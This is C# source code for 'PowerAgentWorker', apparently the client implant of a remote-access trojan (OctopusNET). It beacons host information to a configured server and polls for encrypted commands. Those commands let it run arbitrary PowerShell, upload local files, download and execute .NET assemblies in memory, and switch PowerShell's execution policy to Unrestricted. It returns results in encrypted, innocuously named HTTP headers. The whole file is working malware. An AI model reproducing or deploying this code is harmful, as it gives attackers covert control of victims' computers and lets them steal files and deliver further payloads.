using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Reflection;
using OctopusNET.Helpers;


namespace OctopusNET.Services
{
    internal class PowerAgentWorker : IWorker
    {
        #region Members

        private System.Timers.Timer _timer;
        private bool _running;
        private static PowerShell _ps;
        #endregion

        #region Worker Management Functions

        public PowerAgentWorker()
        {
            _ps = PowerShell.Create();
        }

        public void Dispose()
        {
            //
        }

        public void Start()
        {
            Notify();
            _running = true;
            StartTimer();
        }

        public void Cancel()
        {
            _running = false;
            StopTimer();
        }


        public void Wait()
        {

        }

        public event EventHandler Completed;

        protected virtual void OnCompleted()
        {
            Completed?.Invoke(this, EventArgs.Empty);
        }


        #endregion

        #region Timer Functions

        private void StartTimer()
        {
            _timer = new System.Timers.Timer { Interval = TimeSpan.FromSeconds(Config.M4).TotalMilliseconds };
            _timer.Elapsed += OnTimerElapsed;
            _timer.Start();
        }

        private void OnTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (!_running)
                return;
            try
            {
                // One task at a time.
                StopTimer();

                var cmd = CheckForTasks();

                // Execute
                ProcessCmd(cmd);
            }
            finally
            {
                // Re-Start the timer.. allow new task fetching
                StartTimer();
            }
        }


        private void StopTimer()
        {
            if (_timer != null)
            {
                _timer.Stop();
                _timer.Enabled = false;
                _timer.Elapsed -= OnTimerElapsed;
            }
        }

        #endregion


        #region Core Worker functions

        /// <summary>
        /// Say Hello
        /// </summary>
        /// <returns></returns>
        private static void Notify()
        {
            try
            {
                var postUrl = $"{Config.M0}://{Config.M1}/{Config.L1}";
                var sysInfo = SystemInfoHelpers.Instance.SystemInfoCombined;
                var headers = BuildAuthHeader(sysInfo);
                CommonHelpers.GetUrl(postUrl, headers, Config.M3);
            }
            catch (Exception)
            {
                //
            }
        }


        private static string CheckForTasks()
        {
            var tries = 0;

            while (true)
            {
                try
                {
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L2}";
                    postUrl = postUrl.Replace("<hostname>", SystemInfoHelpers.Instance.SystemInfo.Hostname);
                    var result = CommonHelpers.GetUrl(postUrl, null, Config.M3);

                    if (string.IsNullOrEmpty(result) || result.ToLower() == "false")
                        return null;

                    var cmd = CryptoServices.AesServiceProvider.AES_decrypt(result, Config.L7, Config.L77);

                    return cmd;

                }
                catch (Exception)
                {
                    if (tries < Config.L9)
                        tries++;
                    else
                        Environment.Exit(0);
                }
            }
        }

        private static void ProcessCmd(string cmd)
        {
            if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) return;

            cmd = cmd.Trim();
            cmd = new string(cmd.Where(c => !char.IsControl(c)).ToArray());
            cmd = new string(cmd.Where(c => (int)c >= 0x1F).ToArray());
            if (cmd.ToLower() == "false") return;

            try
            {
                if(cmd.ToLower() == "report")
                {
                    var report = BuildDeviceReport();

                    var headers = BuildAuthHeader(report);
                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);

                    // Send execution result
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L4}";
                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
                }
                else if (cmd.ToLower().StartsWith("download ") && cmd.Length > 9)
                {
                    var path = cmd.Trim().Substring(9).Trim();
                    var reqParams = BuildFileUploadParams(path) ?? new Dictionary<string, object>();
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L5}";
                    CommonHelpers.WebPostForm(reqParams, null, postUrl, Config.M3);
                }
                else if (cmd.ToLower().StartsWith("load_assembly") && cmd.Length > 9)
                {
                    cmd = cmd.Replace("load_assembly", "");
                    var result = LoadAssembly(cmd);
                    if (result == null)
                        result = string.Empty;

                    // Prepare response with result to API
                    var headers = BuildAuthHeader(result);
                    headers = AddSessionHeader(cmd, headers);
                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);


                    // Send execution result
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
                }
                else if (cmd.ToLower().StartsWith("bypass-execpolicy") && cmd.Length > 9)
                {
                    var result = ByPassExecutionPolicy();
                    if (result == null)
                        result = string.Empty;

                    // Prepare response with result to API
                    var headers = BuildAuthHeader(result);
                    headers = AddSessionHeader(cmd, headers);
                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);


                    // Send execution result
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
                }
                else if (cmd.ToLower() == "reset-ps")
                {
                    _ps = PowerShell.Create();

                    // Prepare response with result to API
                    var headers = BuildAuthHeader("OK");
                    headers = AddSessionHeader(cmd, headers);
                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);

                    // Send execution result
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
                }
                else
                {
                    var result = RunPs(cmd);
                    if (result == null)
                        result = string.Empty;

                    // Prepare response with result to API
                    var headers = BuildAuthHeader(result);
                    headers = AddSessionHeader(cmd, headers);
                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);


                    // Send execution result
                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
                }
            }
            catch (Exception e)
            {
                // Prepare response with result to API
                var headers = BuildAuthHeader(e.Message);
                headers = AddSessionHeader(cmd, headers);
                headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);

                // Send execution result
                var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
                CommonHelpers.GetUrl(postUrl, headers, Config.M3);
            }
        }


        private static string RunPs(string code)
        {
            _ps.AddScript(code);

            var output = _ps.Invoke();

            if (output != null && output.Count > 0)
                return output[0].BaseObject.ToString();

            return string.Empty;
        }

        private static string BuildDeviceReport()
        {
            try
            {
                var procList = CommonHelpers.GetProcNameList();
                var proc = procList.Aggregate((i, j) => i + " " + j);

                var ipList = CommonHelpers.GetLocalIps();
                var ips = ipList.Aggregate((i, j) => i + ";" + j);
                var arr = new[]
                {
                    $"{proc}",
                    $"{ips}",
                    $"{Environment.OSVersion.Version}",
                    $"{CultureInfo.InstalledUICulture.Name}",
                    $"{CommonHelpers.GetComputerUpTime()}",
                    $"{DateTime.Now:HH:mm(MM/dd/yyyy)}"
                };

                var fi = arr.Aggregate((i, j) => i + " " + j);
                return fi.Trim();

            }
            catch (Exception)
            {
                return string.Empty;
            }
        }


        private static string LoadAssembly(string input)
        {
            var downloadUrl = string.Empty;
            var param = string.Empty;

            try
            {
                if (string.IsNullOrEmpty(input))
                    throw new ArgumentNullException(nameof(input));

                input = input.Trim();


                if (input.Contains("--params="))
                {
                    downloadUrl = input.Substring(0, input.IndexOf("--params=", StringComparison.InvariantCulture)).Trim();

                    var toMatch = "--params=";
                    param = input.Substring(input.IndexOf(toMatch, StringComparison.InvariantCulture) + toMatch.Length).Trim();
                }
                else
                {
                    downloadUrl = input;
                }


                var wb = new WebClient();
                var food = wb.DownloadData(downloadUrl);

                var asm = Assembly.Load(food).EntryPoint;

                if (asm == null)
                    throw new ArgumentNullException(nameof(asm));


                if (!string.IsNullOrEmpty(param))
                {
                    var parameters = new[] { param };
                    asm.Invoke(null, new object[] { parameters });
                }
                else
                {
                    asm.Invoke(null, new object[] { new[] { "" } });
                }

                return "Delivered!";
            }
            catch (WebException)
            {
                return $"Failed to Download '{downloadUrl}'";
            }
            catch (Exception e)
            {
                return $"Failed to load the assembly '{downloadUrl}' {e.Message}";
            }
        }


        private static string ByPassExecutionPolicy()
        {
            _ps.Commands.AddCommand("Get-ExecutionPolicy");
            if (_ps.AddCommand("Get-ExecutionPolicy").Invoke().First().ToString() == "Restricted")
            {
                _ps.Commands.AddCommand("Set-ExecutionPolicy");
                _ps.Commands.AddArgument("Unrestricted");
                _ps.Invoke();
            }

            return _ps.AddCommand("Get-ExecutionPolicy").Invoke().First().ToString();
        }

        private static Dictionary<string, string> BuildAuthHeader(string text)
        {
            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);
            return new Dictionary<string, string> {{"Authorization", ec}};
        }

        private static Dictionary<string, string> AddAppLogicHeader(string text, Dictionary<string, string> headers)
        {
            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);

            if (headers.ContainsKey("App-Logic"))
                headers["App-Logic"] = ec;
            else
                headers.Add("App-Logic", ec);

            return headers;
        }

        private static Dictionary<string, string> AddSessionHeader(string text, Dictionary<string, string> headers)
        {
            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);

            if (headers.ContainsKey("Session"))
                headers["Session"] = ec;
            else
                headers.Add("Session", ec);

            return headers;
        }

        private static Dictionary<string, object> BuildFileUploadParams(string fPath)
        {
            var fi = new FileInfo(fPath);
            if (!fi.Exists)
                return null;

            var fInfo = new UploadFileInfo(fi);
            var fileEncoded64 = Convert.ToBase64String(fInfo.FileBytes);
            var dict = new Dictionary<string, object>
            {
                ["fn"] = CryptoServices.AesServiceProvider.AES_encrypt(fi.Name, Config.L7, Config.L77),
                ["token"] = CryptoServices.AesServiceProvider.AES_encrypt(fileEncoded64, Config.L7, Config.L77)
            };

            return dict;
        }

        #endregion

    }
}
